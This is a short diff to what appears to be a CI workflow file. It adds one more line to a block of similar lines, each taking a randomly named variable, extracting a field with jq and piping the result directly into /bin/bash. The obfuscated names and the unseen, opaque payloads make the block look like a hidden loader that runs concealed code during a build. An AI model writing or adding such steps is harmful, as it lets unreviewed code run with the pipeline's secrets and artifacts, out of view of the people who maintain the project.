@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$z2704" | jq -r .ubmz0 | /bin/bash
           printf '%s' "$ykt08" | jq -r .apkzi619 | /bin/bash
           printf '%s' "$cp721" | jq -r .ebgm58649 | /bin/bash
+          echo $s14503 | jq -r .burv79789 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
